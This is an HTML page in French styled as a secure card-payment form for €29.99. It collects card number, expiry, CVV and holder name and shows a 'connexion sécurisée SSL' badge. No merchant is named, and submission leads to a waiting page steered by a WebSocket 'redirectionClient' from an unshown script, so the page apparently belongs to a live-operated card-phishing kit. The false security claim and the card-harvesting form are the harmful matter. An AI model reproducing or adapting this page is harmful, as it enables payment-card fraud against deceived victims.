<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Paiement Sécurisé</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <script src="/js/websocket-client-optimized.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 500px;
            width: 100%;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #2c3e50;
            font-size: 2.2em;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .header .subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ecf0f1;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.8);
        }

        .form-group input:focus {
            outline: none;
            border-color: #3498db;
            background: white;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }

        .form-row {
            display: flex;
            gap: 15px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .submit-btn:hover {
            background: linear-gradient(135deg, #2980b9, #1f5f8b);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .security-info {
            background: #e8f5e8;
            border: 1px solid #27ae60;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }

        .security-info .icon {
            color: #27ae60;
            font-size: 24px;
            margin-bottom: 5px;
        }

        .security-info .text {
            color: #27ae60;
            font-size: 14px;
            font-weight: 600;
        }

        .connection-indicator {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #27ae60;
            animation: pulse 2s infinite;
            z-index: 1000;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }

        .connection-indicator.disconnected {
            background: #e74c3c;
            animation: none;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
                margin: 10px;
            }
            
            .header h1 {
                font-size: 1.8em;
            }
            
            .form-row {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>
    <div class="connection-indicator" id="connectionIndicator"></div>
    
    <div class="container">
        <div class="header">
            <h1>💳 Paiement Sécurisé</h1>
            <div class="subtitle">Veuillez saisir vos informations de paiement</div>
        </div>

        <div class="security-info">
            <div class="icon">🔒</div>
            <div class="text">Connexion sécurisée SSL - Vos données sont protégées</div>
        </div>

        <form id="paymentForm" onsubmit="handleFormSubmit(event)">
            <div class="form-group">
                <label for="cardNumber">Numéro de carte</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="expiryDate">Date d'expiration</label>
                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <div class="form-group">
                <label for="cardHolder">Nom du titulaire</label>
                <input type="text" id="cardHolder" name="cardHolder" placeholder="Jean Dupont" required>
            </div>

            <div class="form-group">
                <label for="amount">Montant</label>
                <input type="text" id="amount" name="amount" value="€ 29.99" readonly>
            </div>

            <button type="submit" class="submit-btn">
                🔒 Confirmer le Paiement
            </button>
        </form>
    </div>

    <script>
        // Formatage automatique des champs
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });

        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });

        // Gestion de la soumission du formulaire
        function handleFormSubmit(event) {
            event.preventDefault();
            
            // Simulation d'un traitement
            const submitBtn = document.querySelector('.submit-btn');
            const originalText = submitBtn.innerHTML;
            
            submitBtn.innerHTML = '⏳ Traitement en cours...';
            submitBtn.disabled = true;
            
            setTimeout(() => {
                // Redirection vers la page d'attente
                if (window.redirectToWaitingPage) {
                    window.redirectToWaitingPage();
                } else {
                    window.location.href = '/att.html';
                }
            }, 2000);
        }

        // Gestion de l'indicateur de connexion WebSocket
        document.addEventListener('DOMContentLoaded', function() {
            const indicator = document.getElementById('connectionIndicator');
            
            // Écouter les événements de connexion WebSocket
            if (window.redirectionClient) {
                window.redirectionClient.on('connected', () => {
                    indicator.classList.remove('disconnected');
                });
                
                window.redirectionClient.on('disconnected', () => {
                    indicator.classList.add('disconnected');
                });
            }
        });
    </script>
</body>
</html>
